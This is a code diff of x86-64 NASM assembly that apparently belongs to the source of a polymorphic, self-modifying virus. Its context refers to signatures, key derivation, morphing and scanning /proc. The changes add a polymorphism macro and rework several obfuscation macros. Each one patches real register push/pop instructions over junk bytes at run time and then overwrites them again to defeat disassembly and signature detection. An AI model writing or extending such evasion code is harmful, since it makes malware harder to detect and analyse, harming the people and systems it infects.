@@ -56,6 +56,24 @@
 %define SIGNATURE_OFFSET	signature - _start + 40
 %define BEGIN_SIGNATURE_OFFSET_FORM_END _end - signature - 1
 
+%define POLY_OFFSET_1	_start.label_poly1 - _start
+
+
+%macro OBF_POLY_1 0
+	OBF_PUSH_RAX
+	OBF_PUSH_RDI
+	call .pop9
+	.pop9:
+	pop rdi
+	mov rax, rdi
+	mov dword[rdi+12], 0x90909090
+	pop rdi
+	.label_poly1:
+	dd 0xAAAAAAAA
+	mov rbx, 0x00000000
+	mov dword[rax+12], ebx
+	pop rax
+%endmacro
 
 ; MACROS
 
@@ -143,9 +161,11 @@ db 0xF3
 	call .pop
 	.pop:
 	pop r8
-	mov dword[r8+12], 0x51415041
+	mov rax, r8
+	mov dword[r8+15], 0x51415041
 	pop r8
 	dd 0xADE1F1FF
+	mov dword[rax+15], 0x0FDE21C3
 %endmacro
 
 %macro OBF_OVERWRITE_PUSHR10R11 0
@@ -153,9 +173,11 @@ db 0xF3
 	call .pop1
 	.pop1:
 	pop r8
-	mov dword[r8+12], 0x53415241
+	mov rax, r8
+	mov dword[r8+15], 0x53415241
 	pop r8
 	dd 0xFFADE1F1
+	mov dword[rax+15], 0xAE0F1233
 %endmacro
 
 %macro OBF_OVERWRITE_PUSHR12R13 0
@@ -163,9 +185,11 @@ db 0xF3
 	call .pop2
 	.pop2:
 	pop rdi
-	mov dword[rdi+9], 0x55415441
+	mov rax, rdi
+	mov dword[rdi+12], 0x55415441
 	pop rdi
 	dd 0xEEA0FDF1
+	mov dword[rax+12], 0xCC010203
 %endmacro
 
 %macro OBF_OVERWRITE_PUSHR14R15 0
@@ -173,9 +197,11 @@ db 0xF3
 	call .pop3
 	.pop3:
 	pop rdi
-	mov dword[rdi+9], 0x57415641
+	mov rax, rdi
+	mov dword[rdi+12], 0x57415641
 	pop rdi
 	dd 0xEEA0C3F1
+	mov dword[rax+12], 0x09e97171
 %endmacro
 
 %macro OBF_OVERWRITE_POPR9R8 0
@@ -183,9 +209,11 @@ db 0xF3
 	call .pop4
 	.pop4:
 	pop r8
-	mov dword[r8+12], 0x58415941
+	mov rax, r8
+	mov dword[r8+15], 0x58415941
 	pop r8
 	dd 0xADE1F1FF
+	mov dword[rax+15], 0xCDCE1212
 %endmacro
 
 %macro OBF_OVERWRITE_POPR11R10 0
@@ -193,9 +221,11 @@ db 0xF3
 	call .pop5
 	.pop5:
 	pop r8
-	mov dword[r8+12], 0x5A415B41
+	mov rax, r8
+	mov dword[r8+15], 0x5A415B41
 	pop r8
 	dd 0xFFADE1F1
+	mov dword[rax+15], 0x66AEF700
 %endmacro
 
 %macro OBF_OVERWRITE_POPR13R12 0
@@ -203,9 +233,11 @@ db 0xF3
 	call .pop6
 	.pop6:
 	pop rdi
-	mov dword[rdi+9], 0x5C415D41
+	mov rax, rdi
+	mov dword[rdi+12], 0x5C415D41
 	pop rdi
 	dd 0xEEA0FDF1
+	mov dword[rax+12], 0xBBDFDEAD
 %endmacro
 
 %macro OBF_OVERWRITE_POPR15R14 0
@@ -213,9 +245,11 @@ db 0xF3
 	call .pop7
 	.pop7:
 	pop rdi
-	mov dword[rdi+9], 0x5E415F41
+	mov rax, rdi
+	mov dword[rdi+12], 0x5E415F41
 	pop rdi
 	dd 0xEEA0C3F1
+	mov dword[rax+12], 0x12131441
 %endmacro
 
 
@@ -445,6 +479,7 @@ db 0xF3
 .factor			resb	1				; factor to derivate key
 .morph_sign_u	resb	1				; factor to add to signature
 .morph_sign_d	resb	1				; factor to add to ssignature  tenth
+.tmp_rand		resw	1				;
 .commpath		resb	100				; path to commfiles
 .dirents_proc	resb	DIRENT_ARR_SIZE	; Array of dirents for /proc
 endstruc
